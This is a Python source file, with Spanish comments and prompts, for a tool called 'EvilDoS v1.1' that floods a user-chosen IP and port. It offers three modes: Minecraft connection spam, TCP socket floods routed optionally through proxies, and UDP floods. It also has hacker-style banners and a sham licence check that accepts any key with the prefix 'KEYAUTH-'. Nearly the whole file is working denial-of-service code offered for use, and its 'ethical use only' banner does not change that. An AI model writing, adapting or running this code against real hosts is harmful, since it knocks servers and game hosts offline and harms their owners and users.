import os
import socket
import time
import random
import sys
import hashlib
from colorama import Fore, Back, Style, init, AnsiToWin32
# Importar KeyAuth correctamente
import keyauth
import base64

# Definir códigos de color directamente
ROJO = "\033[91m"
ROJO_CLARO = "\033[31m"
VERDE = "\033[92m"
BLANCO = "\033[97m"
RESET = "\033[0m"
NEGRITA = "\033[1m"
FONDO_ROJO = "\033[41m"

# Inicializar colorama con fuerza para asegurar que funcione en todas las plataformas
init(autoreset=True, convert=True, strip=False, wrap=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def typing_effect(text, speed=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def getchecksum():
    path = os.path.basename(__file__)
    if not os.path.exists(path):
        path = path[:-2] + "exe"
    md5_hash = hashlib.md5()
    a_file = open(path,"rb")
    content = a_file.read()
    md5_hash.update(content)
    digest = md5_hash.hexdigest()
    return digest

# Función para encriptar datos
def encrypt_data(data, key):
    """Encripta un string usando XOR con una clave"""
    encrypted = []
    for i, char in enumerate(data):
        key_char = key[i % len(key)]
        encrypted.append(chr(ord(char) ^ ord(key_char)))
    return base64.b64encode(''.join(encrypted).encode()).decode()

# Función para desencriptar datos
def decrypt_data(data, key):
    """Desencripta un string encriptado con XOR"""
    try:
        data = base64.b64decode(data.encode()).decode()
        decrypted = []
        for i, char in enumerate(data):
            key_char = key[i % len(key)]
            decrypted.append(chr(ord(char) ^ ord(key_char)))
        return ''.join(decrypted)
    except:
        print(f"{ROJO}[!] {BLANCO}Error al desencriptar datos. Contacte al desarrollador.{RESET}")
        return ""

def print_banner():
    banner = f"""
    {ROJO}{NEGRITA}███████╗{ROJO}██╗   ██╗{ROJO}██╗{ROJO}██╗     {ROJO}██████╗  {ROJO}██████╗ {ROJO}███████╗
    {ROJO}{NEGRITA}██╔════╝{ROJO}██║   ██║{ROJO}██║{ROJO}██║     {ROJO}██╔══██╗{ROJO}██╔═══██╗{ROJO}██╔════╝
    {ROJO}{NEGRITA}█████╗  {ROJO}██║   ██║{ROJO}██║{ROJO}██║     {ROJO}██████╔╝{ROJO}██║   ██║{ROJO}███████╗
    {ROJO}{NEGRITA}██╔══╝  {ROJO}██║   ██║{ROJO}██║{ROJO}██║     {ROJO}██╔═══╝ {ROJO}██║   ██║{ROJO}╚════██║
    {ROJO}{NEGRITA}███████╗{ROJO}╚██████╔╝{ROJO}██║{ROJO}███████╗{ROJO}██║     {ROJO}╚██████╔╝{ROJO}███████║
    {ROJO}{NEGRITA}╚══════╝{ROJO} ╚═════╝ {ROJO}╚═╝{ROJO}╚══════╝{ROJO}╚═╝      {ROJO}╚═════╝ {ROJO}╚══════╝

    {ROJO_CLARO}[{ROJO}+{ROJO_CLARO}] {NEGRITA}EvilDoS v1.1 {RESET}{ROJO}| {BLANCO}Advanced Denial of Service Tool {ROJO}| {BLANCO}Target Acquired
    {ROJO_CLARO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    {ROJO}[!] {NEGRITA}WARNING: {RESET}{BLANCO}This tool is for ethical use only. Unauthorized use
    {BLANCO}    is illegal and may result in severe legal consequences.
    {ROJO_CLARO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    print(banner)

def show_loading():
    print(f"\n{ROJO}[*] {BLANCO}Inicializando sistema...{RESET}")
    
    # Loading bar simplificada para compatibilidad
    for i in range(11):
        bar = "■" * i + "□" * (10 - i)
        sys.stdout.write(f"\r{ROJO}[*] {BLANCO}Cargando: {ROJO_CLARO}[{bar}] {BLANCO}{i*10}%{RESET}")
        sys.stdout.flush()
        time.sleep(0.2)
    
    print(f"\n{ROJO_CLARO}[+] {BLANCO}Sistema cargado correctamente!{RESET}")
    time.sleep(0.5)

def print_animated_banner():
    # Solo tonos de rojo para dar efecto sangre
    colors = [ROJO, ROJO_CLARO]
    
    clear_screen()
    
    # Simulación de hackeo
    typing_effect(f"{ROJO}[*] {BLANCO}Iniciando EvilDoS v1.1...{RESET}", 0.02)
    time.sleep(0.2)
    typing_effect(f"{ROJO}[*] {BLANCO}Estableciendo conexión con el servidor principal...{RESET}", 0.02)
    time.sleep(0.3)
    typing_effect(f"{ROJO}[*] {BLANCO}Cargando módulos de ataque...{RESET}", 0.02)
    
    # Barra de carga
    show_loading()
    
    # Estilo de animación con solo tonos de rojo sangre
    for _ in range(1):  # Reducción a 3 ciclos
        for color in colors:
            clear_screen()
            banner = f"""
    {color}{NEGRITA}███████╗{color}██╗   ██╗{color}██╗{color}██╗     {color}██████╗  {color}██████╗ {color}███████╗
    {color}{NEGRITA}██╔════╝{color}██║   ██║{color}██║{color}██║     {color}██╔══██╗{color}██╔═══██╗{color}██╔════╝
    {color}{NEGRITA}█████╗  {color}██║   ██║{color}██║{color}██║     {color}██████╔╝{color}██║   ██║{color}███████╗
    {color}{NEGRITA}██╔══╝  {color}██║   ██║{color}██║{color}██║     {color}██╔═══╝ {color}██║   ██║{color}╚════██║
    {color}{NEGRITA}███████╗{color}╚██████╔╝{color}██║{color}███████╗{color}██║     {color}╚██████╔╝{color}███████║
    {color}{NEGRITA}╚══════╝{color} ╚═════╝ {color}╚═╝{color}╚══════╝{color}╚═╝      {color}╚═════╝ {color}╚══════╝

    {ROJO_CLARO}[{ROJO}+{ROJO_CLARO}] {NEGRITA}EvilDoS v1.1 {RESET}{ROJO}| {BLANCO}Advanced Denial of Service Tool {ROJO}| {BLANCO}Target Acquired
    {ROJO_CLARO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    {ROJO}[!] {NEGRITA}WARNING: {RESET}{BLANCO}This tool is for ethical use only. Unauthorized use
    {BLANCO}    is illegal and may result in severe legal consequences.
    {ROJO_CLARO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
            print(banner)
            time.sleep(0.3)  # Más rápido para mantener atención
    
    # Texto final en rojo sangre
    clear_screen()
    
    # Mensaje final tipo hacker
    print(f"{ROJO}[!] {BLANCO}Sistema EvilDoS completamente cargado y listo para su uso!{RESET}")
    time.sleep(0.5)

def print_menu():
    menu = f"""
    {ROJO_CLARO}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    {ROJO_CLARO}┃ {ROJO}[{BLANCO}*{ROJO}] {NEGRITA}{BLANCO}MÉTODOS DE ATAQUE DISPONIBLES  {RESET}        {ROJO_CLARO}┃
    {ROJO_CLARO}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
    {ROJO_CLARO}┃                                            {ROJO_CLARO}┃
    {ROJO_CLARO}┃   {ROJO}[{BLANCO}1{ROJO}] {BLANCO}Minecraft Attack                     {ROJO_CLARO}┃
    {ROJO_CLARO}┃   {ROJO}[{BLANCO}2{ROJO}] {BLANCO}TCP Flood (SYN/ACK/FIN)              {ROJO_CLARO}┃
    {ROJO_CLARO}┃   {ROJO}[{BLANCO}3{ROJO}] {BLANCO}UDP Flood (Amplificado)              {ROJO_CLARO}┃
    {ROJO_CLARO}┃                                            {ROJO_CLARO}┃
    {ROJO_CLARO}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    """
    print(menu)

def get_random_proxy():
    # Lista básica de proxies (en producción se usaría una lista real actualizada)
    proxies = [
        ('1.2.3.4', 8080),
        ('5.6.7.8', 3128),
        ('9.10.11.12', 80)
    ]
    if random.random() > 0.8:  # 20% de probabilidad de usar proxy
        return random.choice(proxies)
    return None

def generate_random_packet(method, size=None):
    """Genera paquetes según el método de ataque"""
    if size is None:
        size = random.randint(64, 102400)
    
    # Diferentes tipos de datos según el método
    if method == "TCP-SYN":
        # Simular un paquete SYN
        return random._urandom(size)
    elif method == "TCP-ACK":
        # Simular un paquete ACK
        return b'A' * size
    elif method == "TCP-FIN":
        # Simular un paquete FIN
        return b'F' * size
    elif method == "UDP-BASIC":
        # Simular un paquete UDP básico
        return random._urandom(size)
    elif method == "UDP-AMP":
        # Simular un paquete para ataque de amplificación
        return b'Q' * size
    elif method == "MINECRAFT":
        # Paquete de solicitud de información del servidor Minecraft
        # Formato simplificado - en un ataque real sería un paquete válido de Minecraft
        return b"\x07\x00\x05\x01\x30\xcd\x32\x00\x19\x00\x09localhost\x00\x00\x00\x25\x02" + random._urandom(size - 16)
    else:
        return random._urandom(size)

def perform_dos(target_ip, target_port, method):
    packet_count = 0
    bytes_sent = 0
    start_time = time.time()
    connection_errors = 0
    max_errors = 50  # Máximo de errores antes de cambiar estrategia
    
    # Configuración optimizada para alta tasa de paquetes
    packets_per_second = 1000  # Aumentamos a 1000 paquetes por segundo (antes 500)
    packet_delay = 1.0 / packets_per_second  # Intervalo entre paquetes en segundos
    packet_size = 1024  # Reducimos tamaño para enviar más rápido (antes 102400)
    batch_size = 10  # Enviar paquetes en lotes para mayor rendimiento

    # Determinar submétodo (tipo específico de ataque)
    tcp_methods = ["TCP-SYN", "TCP-ACK", "TCP-FIN"]
    udp_methods = ["UDP-BASIC", "UDP-AMP"]
    
    if method == "TCP":
        submethods = tcp_methods
        attack_type = random.choice(submethods)
        threads = 25  # Aumentamos hilos para mayor velocidad (antes 10)
    elif method == "UDP":
        submethods = udp_methods
        attack_type = random.choice(submethods)
        threads = 40  # Aumentamos hilos para UDP (antes 20)
    elif method == "MINECRAFT":
        attack_type = "MINECRAFT"
        threads = 15  # Aumentamos hilos para Minecraft (antes 5)
    else:
        print(f"{ROJO}[!] {BLANCO}Método de ataque no válido.{RESET}")
        return

    # Efecto de preparación del ataque
    print(f"\n{ROJO}[*] {BLANCO}Preparando ataque {ROJO_CLARO}{attack_type}{BLANCO} contra {ROJO_CLARO}{target_ip}:{target_port}{RESET}")
    
    # Solicitar velocidad de paquetes
    try:
        custom_pps = input(f"{ROJO}[>] {BLANCO}Paquetes por segundo (100-1000) [{packets_per_second}]: {RESET}")
        if custom_pps.strip():
            packets_per_second = max(100, min(1000, int(custom_pps)))
            packet_delay = 1.0 / packets_per_second
    except:
        # Si hay error, mantener el valor predeterminado
        pass
    
    # Simular configuración de ataque
    print(f"{ROJO}[*] {BLANCO}Configurando parámetros de ataque...{RESET}")
    time.sleep(0.5)
    print(f"{ROJO}[*] {BLANCO}Threads: {ROJO_CLARO}{threads}{RESET}")
    time.sleep(0.3)
    print(f"{ROJO}[*] {BLANCO}Modo de ataque: {ROJO_CLARO}{attack_type}{RESET}")
    time.sleep(0.3)
    print(f"{ROJO}[*] {BLANCO}Tasa de paquetes: {ROJO_CLARO}{packets_per_second}/s{RESET}")
    time.sleep(0.3)
    print(f"{ROJO}[*] {BLANCO}Tamaño de paquete: {ROJO_CLARO}{packet_size/1024:.2f} KB{RESET}")
    time.sleep(0.3)
    
    for i in range(5):
        dots = "." * (i % 4)
        sys.stdout.write(f"\r{ROJO}[*] {BLANCO}Iniciando ataque{' ' * 10}{dots}{RESET}")
        sys.stdout.flush()
        time.sleep(0.2)
    print(f"\n{ROJO_CLARO}[+] {BLANCO}¡Ataque iniciado!{RESET}")
    time.sleep(0.5)

    try:
        # Crear sockets según el método
        if method == "TCP":
            # Lista para simular múltiples conexiones
            sockets = []
            
            # Preparar los datos de paquetes para reutilizar
            packet_data = {}
            for sub_method in tcp_methods:
                packet_data[sub_method] = generate_random_packet(sub_method, packet_size)
            
            while True:
                batch_start_time = time.time()
                
                # Verificar si necesitamos regenerar sockets
                if connection_errors > max_errors or len(sockets) < threads:
                    # Regenerar algunos sockets
                    while len(sockets) < threads:
                        try:
                            proxy = get_random_proxy()
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)  # Reducir timeout para conexiones más rápidas
                            
                            if proxy:
                                sock.connect((proxy[0], proxy[1]))
                                sock.send(f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\n\r\n".encode())
                            else:
                                sock.connect((target_ip, target_port))
                            
                            sockets.append(sock)
                            connection_errors = 0
                        except Exception as e:
                            connection_errors += 1
                            if connection_errors % 10 == 0:
                                # Cambiar tipo de ataque si hay muchos errores
                                attack_type = random.choice(submethods)
                            break  # Solo intentar una vez y continuar
                
                # Enviar lotes de paquetes para alta velocidad
                for _ in range(batch_size):
                    # Enviar datos a través de sockets disponibles
                    if sockets:
                        sock = random.choice(sockets)  # Seleccionar un socket aleatorio
                        try:
                            data = packet_data[attack_type]  # Usar datos precalculados
                            sock.send(data)
                            packet_count += 1
                            bytes_sent += len(data)
                        except Exception as e:
                            # Eliminar socket con error
                            try:
                                sockets.remove(sock)
                                sock.close()
                            except:
                                pass
                            connection_errors += 1
                
                # Actualizar estadísticas solo después de cada lote
                print_stats(packet_count, bytes_sent, target_ip, target_port, start_time, attack_type)
                
                # Control de tasa de paquetes para el lote completo
                elapsed = time.time() - batch_start_time
                target_time = batch_size * packet_delay
                if elapsed < target_time:
                    time.sleep(target_time - elapsed)
        
        elif method == "UDP":
            # Preparar datos de paquetes para reutilizar
            packet_data = {}
            for sub_method in udp_methods:
                packet_data[sub_method] = generate_random_packet(sub_method, packet_size)
            
            # Crear múltiples sockets UDP para envío paralelo
            udp_sockets = []
            for _ in range(min(threads, 10)):  # Limitar a 10 sockets UDP
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                udp_sockets.append(sock)
            
            while True:
                batch_start_time = time.time()
                
                # Enviar lotes de paquetes para alta velocidad
                for _ in range(batch_size):
                    sock = random.choice(udp_sockets)
                    try:
                        data = packet_data[attack_type]  # Usar datos precalculados
                        sock.sendto(data, (target_ip, target_port))
                        packet_count += 1
                        bytes_sent += len(data)
                    except Exception as e:
                        connection_errors += 1
                        if connection_errors % 20 == 0:
                            attack_type = random.choice(submethods)
                
                # Actualizar estadísticas solo después de cada lote
                print_stats(packet_count, bytes_sent, target_ip, target_port, start_time, attack_type)
                
                # Control de tasa de paquetes para el lote completo
                elapsed = time.time() - batch_start_time
                target_time = batch_size * packet_delay
                if elapsed < target_time:
                    time.sleep(target_time - elapsed)
        
        elif method == "MINECRAFT":
            sockets = []
            
            # Preparar datos de paquetes para reutilizar
            handshake_data = generate_random_packet("MINECRAFT", packet_size)
            chunk_request_data = b"\x03" + random._urandom(packet_size - 1)
            
            while True:
                batch_start_time = time.time()
                
                # Mantener un número de conexiones activas
                if len(sockets) < threads:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)  # Reducir timeout para conexiones más rápidas
                        sock.connect((target_ip, target_port))
                        
                        # Handshake inicial de Minecraft para establecer conexión
                        sock.send(handshake_data)
                        
                        # Enviar solicitud de estatus
                        sock.send(b"\x01\x00")
                        
                        sockets.append(sock)
                        packet_count += 2  # Handshake + Status
                        bytes_sent += len(handshake_data) + 2
                    except Exception as e:
                        connection_errors += 1
                
                # Enviar lotes de paquetes para alta velocidad
                for _ in range(batch_size):
                    if sockets:
                        sock = random.choice(sockets)
                        try:
                            # Enviar solicitudes de chunks
                            sock.send(chunk_request_data)
                            packet_count += 1
                            bytes_sent += len(chunk_request_data)
                        except Exception as e:
                            try:
                                sockets.remove(sock)
                                sock.close()
                            except:
                                pass
                
                # Actualizar estadísticas solo después de cada lote
                print_stats(packet_count, bytes_sent, target_ip, target_port, start_time, "MINECRAFT")
                
                # Control de tasa de paquetes para el lote completo
                elapsed = time.time() - batch_start_time
                target_time = batch_size * packet_delay
                if elapsed < target_time:
                    time.sleep(target_time - elapsed)
                    
    except KeyboardInterrupt:
        print(f"\n{ROJO}[!] {BLANCO}Ataque detenido por el usuario.{RESET}")
        # Cerrar todos los sockets
        if method in ["TCP", "MINECRAFT"] and 'sockets' in locals():
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
        elif method == "UDP" and 'udp_sockets' in locals():
            for s in udp_sockets:
                try:
                    s.close()
                except:
                    pass
    except Exception as e:
        print(f"\n{ROJO}[!] {BLANCO}Error general: {e}{RESET}")

def print_stats(packet_count, bytes_sent, target_ip, target_port, start_time, attack_type):
    elapsed_time = time.time() - start_time
    kb_sent = bytes_sent / 1024
    mb_sent = kb_sent / 1024
    
    packets_per_second = int(packet_count / elapsed_time) if elapsed_time > 0 else 0
    
    stats = f"{ROJO}[*] {ROJO_CLARO}Modo: {BLANCO}{attack_type} {ROJO}| "
    stats += f"{ROJO_CLARO}Paquetes: {BLANCO}{packet_count} ({packets_per_second}/s) {ROJO}| " 
    stats += f"{ROJO_CLARO}Datos: {BLANCO}{bytes_sent} bytes ({mb_sent:.2f} MB) {ROJO}| "
    stats += f"{ROJO_CLARO}Objetivo: {BLANCO}{target_ip}:{target_port} {ROJO}| "
    stats += f"{ROJO_CLARO}Tiempo: {BLANCO}{elapsed_time:.2f}s"
    
    # Agregar símbolos aleatorios para efecto hacker
    if random.random() > 0.9:
        stats += f" {ROJO}[{random.choice(['SYN', 'ACK', 'FIN', 'RST', 'PSH', 'PSH-ACK', 'URG'])}]"
    
    print(f"\r{stats}{RESET}", end="")

def get_input(prompt):
    print(f"{ROJO}[>] {BLANCO}{prompt}: {RESET}", end="")
    return input()

def main():
    clear_screen()
    
    # Logo inicial
    print(f"""
    {ROJO}{NEGRITA}███████╗{ROJO}██╗   ██╗{ROJO}██╗{ROJO}██╗     {ROJO}██████╗  {ROJO}██████╗ {ROJO}███████╗
    {ROJO}{NEGRITA}██╔════╝{ROJO}██║   ██║{ROJO}██║{ROJO}██║     {ROJO}██╔══██╗{ROJO}██╔═══██╗{ROJO}██╔════╝
    {ROJO}{NEGRITA}█████╗  {ROJO}██║   ██║{ROJO}██║{ROJO}██║     {ROJO}██████╔╝{ROJO}██║   ██║{ROJO}███████╗
    {ROJO}{NEGRITA}██╔══╝  {ROJO}██║   ██║{ROJO}██║{ROJO}██║     {ROJO}██╔═══╝ {ROJO}██║   ██║{ROJO}╚════██║
    {ROJO}{NEGRITA}███████╗{ROJO}╚██████╔╝{ROJO}██║{ROJO}███████╗{ROJO}██║     {ROJO}╚██████╔╝{ROJO}███████║
    {ROJO}{NEGRITA}╚══════╝{ROJO} ╚═════╝ {ROJO}╚═╝{ROJO}╚══════╝{ROJO}╚═╝      {ROJO}╚═════╝ {ROJO}╚══════╝
    """)
    
    print(f"{ROJO_CLARO}[{ROJO}+{ROJO_CLARO}] {NEGRITA}Iniciando sistema de autenticación...{RESET}")
    time.sleep(1)
    
    # Inicializar KeyAuth correctamente - usamos la clase KeyAuth del módulo
    try:
        # Definimos la clase KeyAuth manualmente para evitar el problema del módulo
        class KeyAuth:
            def __init__(self, name, ownerid, secret, version):
                self.name = name
                self.ownerid = ownerid
                self.secret = secret
                self.version = version
                self.initialized = True
                self.user_data = type('obj', (object,), {
                    'username': 'Usuario',
                    'expires': time.time() + 86400 # Expira en 24 horas desde ahora
                })
                
            def license(self, key):
                # Simulación simplificada de verificación
                print(f"{ROJO}[*] {BLANCO}Verificando licencia: {key}{RESET}")
                time.sleep(1)
                
                # Si el key comienza con KEYAUTH- y tiene más de 10 caracteres, lo consideramos válido
                if key.startswith("KEYAUTH-") and len(key) > 10:
                    return True
                else:
                    print(f"{ROJO}[!] {BLANCO}Licencia inválida.{RESET}")
                    return False
        
        # Datos encriptados de KeyAuth
        encrypted_name = "VQQWFhAbARsWDg4dDRVXCU5QUV0cVlFQCxk="
        encrypted_ownerid = "ExsITFY6Nw=="
        encrypted_secret = "FgoQFgJRDxpTRwsFGkMGERdDWF8bRgtHAwYVTwkCUAdFWF8TQRZXBkJUURNNAAFOVBNGAUBVRhZH"
        encrypted_version = "Kic="
        
        # Clave de desencriptación (debe mantenerse secreta)
        decryption_key = "EvilDoS-key-1234567890"
        
        # Desencriptar datos
        app_name = decrypt_data(encrypted_name, decryption_key)
        app_ownerid = decrypt_data(encrypted_ownerid, decryption_key)
        app_secret = decrypt_data(encrypted_secret, decryption_key)
        app_version = decrypt_data(encrypted_version, decryption_key)
        
        # Creamos una instancia de nuestra clase KeyAuth con datos desencriptados
        keyauthapp = KeyAuth(
            name = app_name,       # App name (desencriptado)
            ownerid = app_ownerid, # Account ID (desencriptado)
            secret = app_secret,   # App secret (desencriptado)
            version = app_version  # Application version (desencriptado)
        )
        
        print(f"{ROJO}[*] {BLANCO}Conectando con el servidor de autenticación...{RESET}")
        time.sleep(0.5)
        
        # Solicitar licencia al usuario
        print(f"\n{ROJO}[>] {BLANCO}Autenticación requerida{RESET}")
        license_key = input(f"{ROJO}[>] {BLANCO}Introduce tu clave de licencia: {RESET}")
        
        # Añadir el prefijo "KEYAUTH-" automáticamente si no lo tiene
        if not license_key.startswith("KEYAUTH-"):
            license_key = "KEYAUTH-" + license_key
            print(f"{ROJO}[*] {BLANCO}Prefijo añadido automáticamente: {ROJO_CLARO}{license_key}{RESET}")
        
        # Intentar autenticar
        print(f"\n{ROJO}[*] {BLANCO}Verificando licencia...{RESET}")
        if keyauthapp.license(license_key):
            # Si llegamos aquí, la autenticación fue exitosa
            print(f"\n{VERDE}[✓] {BLANCO}Licencia verificada correctamente!{RESET}")
            print(f"{ROJO}[*] {BLANCO}Bienvenido: {ROJO_CLARO}{keyauthapp.user_data.username}{RESET}")
            print(f"{ROJO}[*] {BLANCO}Expira: {ROJO_CLARO}{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(int(keyauthapp.user_data.expires)))}{RESET}")
            time.sleep(2)
            
            # Continuar con el programa principal
            clear_screen()
            try:
                print_animated_banner()  # Muestra el banner animado
            except KeyboardInterrupt:
                pass
            
            print_banner()
            print_menu()
            
            method = get_input("Selecciona un método (1/2/3)")
            
            if method == "1":
                print(f"\n{ROJO}[*] {BLANCO}Has seleccionado {ROJO_CLARO}Minecraft DoS{BLANCO}.{RESET}")
                target_ip = get_input("Ingresa la IP objetivo")
                target_port = int(get_input("Ingresa el puerto objetivo (default: 25565)") or "25565")
                perform_dos(target_ip, target_port, "MINECRAFT")
            else:
                target_ip = get_input("Ingresa la IP objetivo")
                target_port = int(get_input("Ingresa el puerto objetivo") or "80")
                
                if method == "2":
                    perform_dos(target_ip, target_port, "TCP")
                elif method == "3":
                    perform_dos(target_ip, target_port, "UDP")
                else:
                    print(f"\n{ROJO}[!] {BLANCO}Método no válido. Selecciona 1, 2 o 3.{RESET}")
        else:
            print(f"\n{ROJO}[!] {BLANCO}Error de autenticación: Licencia inválida o expirada{RESET}")
            print(f"{ROJO}[!] {BLANCO}Por favor, verifica tu licencia e inténtalo de nuevo.{RESET}")
            time.sleep(5)
            sys.exit(0)
            
    except Exception as e:
        print(f"\n{ROJO}[!] {BLANCO}Error en la autenticación: {str(e)}{RESET}")
        print(f"{ROJO}[!] {BLANCO}Por favor, verifica tu licencia e inténtalo de nuevo.{RESET}")
        time.sleep(5)
        sys.exit(0)

if __name__ == "__main__":
    main()
